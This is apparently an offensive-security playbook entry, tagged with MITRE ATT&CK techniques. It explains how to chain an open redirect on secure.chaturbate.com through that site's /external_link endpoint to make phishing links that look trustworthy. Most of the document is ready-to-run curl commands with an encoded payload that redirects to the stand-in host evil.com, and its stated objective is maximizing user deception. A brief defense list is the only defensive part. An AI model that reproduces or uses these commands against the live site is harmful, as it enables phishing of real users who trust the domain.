---
tags:
  - open-redirect
  - phishing
  - chaining
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-chain-external-link-redirect]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[T1566.002]]'
updated_at: '2025-12-14T17:24:27.173Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 33e31f96-8e7e-4d4f-aadd-36d548ee032e
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[T1566.002]]'
---
# Chain Open Redirect with chaturbate.com /external_link Endpoint

## Summary

This procedure chains the open redirect from secure.chaturbate.com /post into the chaturbate.com /external_link endpoint by encoding the vulnerable URL as a parameter, creating a disguised phishing link that proxies the redirect to an arbitrary malicious domain.

## Description

The /external_link endpoint accepts a 'url' parameter and redirects to it, providing a legitimate-looking entry point. By URL-encoding the full vulnerable /post URL (with manipulated prejoin_data), attackers can embed the open redirect, making the phishing link appear as a standard Chaturbate external navigation. This amplifies the attack by leveraging user trust in Chaturbate domains, leading to higher click-through rates for malicious sites.

## Requirements

1. Working open redirect payload from /post endpoint.
2. URL encoding capability (built into curl).
3. Attacker domain in prejoin_data.
4. Access to chaturbate.com.

## Defense

Defensive measures and detection strategies:

- Validate and sanitize 'url' parameters in external_link to block nested redirects.
- Block or log requests to internal secure endpoints via external_link.
- Use short-lived or signed redirect tokens.
- Detect chaining patterns in access logs.

## Objectives

1. Create a multi-hop redirect for phishing.
2. Disguise malicious links as trusted Chaturbate navigation.
3. Maximize user deception potential.

## Instructions

### Step 1: Encode Vulnerable /post URL

**Context**: Construct the full /post URL and double-encode prejoin_data for safe passage through external_link.

**Command** ([[commands/curl-chain-external-link-redirect]]):
```bash
curl -i "https://chaturbate.com/external_link/?url=https%3A%2F%2Fsecure.chaturbate.com%2Fpost%3Fprejoin_data%3Ddomain%252Fevil.com%2F%3F%3D%26weg_digest%3Deacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
```

> Sends the chained request. Expected: Initial redirect to /post, then to evil.com.

### Step 2: Trace the Full Chain

**Context**: Follow redirects to verify end-to-end phishing flow.

**Command** ([[commands/curl-chain-external-link-redirect]] with -L):
```bash
curl -i -L "https://chaturbate.com/external_link/?url=https%3A%2F%2Fsecure.chaturbate.com%2Fpost%3Fprejoin_data%3Ddomain%252Fevil.com%2F%3F%3D%26weg_digest%3Deacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
```

> Follows chain; final output from malicious domain confirms success.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[T1566.002]] Phishing: Spearphishing Link

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-chain-external-link-redirect]]

## Tools Used

- None

## Tags

- [[open-redirect]]
- [[Phishing]]
- [[chaining]]
- [[web]]
